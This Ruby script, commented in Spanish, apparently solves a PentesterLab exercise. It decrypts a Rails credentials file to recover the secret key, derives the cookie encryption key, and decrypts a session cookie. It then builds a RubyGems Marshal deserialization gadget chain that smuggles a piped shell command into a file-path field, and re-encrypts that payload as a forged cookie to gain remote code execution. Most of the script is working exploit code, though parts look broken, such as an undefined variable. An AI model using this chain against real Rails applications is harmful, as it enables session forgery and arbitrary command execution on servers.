#BUsAwx8JXNexLn5bswKDlxX2I7b7RldGdD6aaKQ2kwPz3YCEkav1eLqV7mYgPLP30V%2BxgbwaXyyIaUjK9LeFv2B0Yim2MpXO2%2FDjD94xBadSsIitVc0IgLiTzGXDqwjAmH01zcxlRxBFRFYw5TU%3D--J7lbmN4hwpQY3%2BnU--vfln0iMkwIF1UA%2FliCL3CA%3D%3D
#secret=md5("PentesterLab::Application")
#PKCS5.pbkdf2_hmac_sha1(secret,"Authenticated encrypted cookie",iterations,size_of_key)
#Session encryption AES-256-GCM (es un AEAD, entrega confidencialidad e integridad) si tenemos el key podemos encriptar y desencriptar las sesiones

#uriEncode(base64(encrypted_data)+"--"+base64(iv)+"--"+base64(authentication_tag))

require 'OpenSSL'
require 'digest'
require 'uri'
require 'base64'
require 'JSON'




def getSessionKey(key,credentials)
  data,iv,tag= credentials.split("--").map { |v| ::Base64.strict_decode64(v) }
  puts "Credentials file data:\n"
  puts "Raw Data: #{data}"
  puts "iv: #{iv}"
  puts "tag: #{tag}"

  cipher=OpenSSL::Cipher.new("aes-128-gcm")
  cipher.decrypt
  cipher.key=[key].pack("H*")
  cipher.iv=iv
  cipher.auth_tag=tag
  cipher.auth_data =""
  decrypted_data=cipher.update(data)

  decrypted_data << cipher.final

  puts "Credentials decrypted data: #{decrypted_data}"
  decrypted_data
end

key="9e73a6d99ebd57d2725a865c8af92272"
credentials="efr6YYUYwi7aS5ovUFqi8p3+JfcCHeHsTx84zZx59/oSQ/muiTWV0ytlsTvDTWfoBQO1l/rNLOQnL6Ahd6cSk9pLiTCC4nOq0I9h+aUemWxJFvQ64eATs5hEOgIRWzpV3ut63M61uFMYkbvSR237xQQt77qvvhqjv+AR0XvodIzav0HxnOgmsEZyRh1Qah3zoseu6i7A1K/t91EZFX+jGnYHGi6WFLhsEa8wvce7zBqQEKYMsXqNSYFOr4BWdM3Wju0UAZS/9CQELStr6FNWt7tYxewt2BmCiSjvt3I+/dnPSGEgN9fn0M1uMTHaVHhWsxpAKgAr5U18bYRzg8vhbknF3+EVR2fz4r0vNFTDCJSnJwp9QCYtBK3nZcQfAgWAY+qOcBKdSk9w3eOanbk/aH/VCpiJU+jDXRkM--vSWWLdZfc6YJSGWf--/c2z8KbE7+1weiaoLDDpZw=="
#Decryt Cookie
#
key="PentesterLab::Application"
secret=Digest::MD5.hexdigest(sessionKey)

# Key es igual al valor secret_key_base desencriptado en la funcion getSessionKey
#getSessionKey(key,credentials)
#key="9568c43bf9ee6f3a2363a20308318cd5d68f39881712407d871ef9409e8b8151c821e778ba99bc977e14d05bf88b6c42219358be99de0962e82ca6098888d909"
puts "sessionKey: #{sessionKey}"

key_size=32
salt="authenticated encrypted cookie"
iteration=1000
key=OpenSSL::PKCS5.pbkdf2_hmac_sha1(sessionKey,salt,iteration,key_size)
defaultcipher="aes-256-gcm"

#puts "secret: #{secret}"
puts "key: #{key}"




#
# "rLI6znCXUP%2FC7mSEBm8R3ohVuq89pB40anwRHcXkoRwU0NBHHsUgINpHMMOM3Ev%2FhZI%2FGZWeApehdjJ11lfby7u6Y1L%2BYCy9b%2B9j0JJVsP42XjDpjFRIzGURZHz7g73wQtWLhcQgP7dr4xJdOIPoHgAltwraHfGVUwo%3D--FTmwrfn5Le2yYdz9--Su32kExmu%2FjjLVrKmLRKWw%3D%3D
# 9uthn1wE6SXzoS8jfDrncRtY5bNj5KhiSKKCAivwD9mro7zNRxLzMRAcnEPoIlbdgJ0QznJ7RLVbxxFXgcgevdVya6I%2BR2tdrlIqaeZSHtKP04j3YDJCPp8%2BzWtYKyygWSEoVX8t4D5J5kp3BCuLkMhE7fQ%2FUG%2Fr3AXiFgaJRpE61GwGvQsF%2FUQd6LKxWDHJM3Y1hxvmBqRHDmaHSb3wjI30opPGnFcUy9hk%2FQqprF0hl5uvcS9xK9OSZ4n1nwpYMF3NHns8xOniai2V%2B7XGtgEn100zWjqSUJMgXCZcZPLd9RTSZmlmgbZqx9VSl1GEyO8e1NjpOZ5FgS4%2F9ecntlSKYTqnlRRLwBY07rSuQ%2BSsIeqtY5vbU1xkkUsxeRk7FaAO1i9IwR4Ej99l6Q%3D%3D--nUeXhvaUw%2FwUJyIy--d5VPNqbYdYHFywZpNH4%2BOA%3D%3D
cookie=URI.decode_www_form_component ("lEjOyqAkUe6sQj6MiMSwcI2BO1b7cWC%2BTpEN5cYYk%2BQJa4rUn3QI4tqsN6khjZjzvc4udEMBV2RbmiXOmqyyi4RA3Fv%2B6fSWU0WrC80H8stIWrgaNaNn93Ess5JwFXgQhlYbVR2f3CFc%2FbirFhREwFh8%2FSDybPPF4Icgd8iKhm1JVUdIb4wbz03AqJQIHCm8BeuanhhfcQsr2xyPteleFTNwJyD9qxaoTWl4--U1bOp4Dg5fz0f0QE--%2FHFTlUn%2FOWZZUNXi08M7FA%3D%3D")
data,iv,tag=cookie.split("--")

puts "data: #{data}"
puts "iv: #{iv}"
puts "tag: #{tag}"

data=Base64.decode64(data)
iv=Base64.decode64(iv)
tag=Base64.decode64(tag)

puts "Raw Data: #{data}"
puts "iv: #{iv}"
puts "tag: #{tag}"

cipher=OpenSSL::Cipher.new(defaultcipher)
cipher.decrypt
cipher.key=key
cipher.iv=iv
decrypted_data=cipher.update(data)



puts "Decrypted Data: #{decrypted_data}"


class Gem::StubSpecification
  def initialize; end
end


stub_specification = Gem::StubSpecification.new
stub_specification.instance_variable_set(:@loaded_from, "|/usr/local/bin/score 1bde8715-5ddf-4f03-9c72-897348939e50 1>&2")

puts "STEP n"
stub_specification.name rescue nil
puts


class Gem::Source::SpecificFile
  def initialize; end
end

specific_file = Gem::Source::SpecificFile.new
specific_file.instance_variable_set(:@spec, stub_specification)

other_specific_file = Gem::Source::SpecificFile.new

puts "STEP n-1"
specific_file <=> other_specific_file rescue nil
puts


$dependency_list= Gem::DependencyList.new
$dependency_list.instance_variable_set(:@specs, [specific_file, other_specific_file])

puts "STEP n-2"
$dependency_list.each{} rescue nil
puts


class Gem::Requirement
  def marshal_dump
    [$dependency_list]
  end
end

payload = Marshal.dump(Gem::Requirement.new)

puts "STEP n-3"
Marshal.load(payload) rescue nil
puts

modified_decripted_data=payload


puts "New Data: #{modified_decripted_data}"
#Encrypt Cookie
cipher=OpenSSL::Cipher.new(defaultcipher)
cipher.encrypt
cipher.key=key
iv=cipher.random_iv
cipher.auth_data = ""

data_encrypted=cipher.update(modified_decripted_data)
data_encrypted << cipher.final

finalCookie="#{Base64.strict_encode64(data_encrypted)}--#{Base64.strict_encode64(iv)}--#{Base64.strict_encode64(cipher.auth_tag)}"
puts "finalCookie: #{finalCookie}"
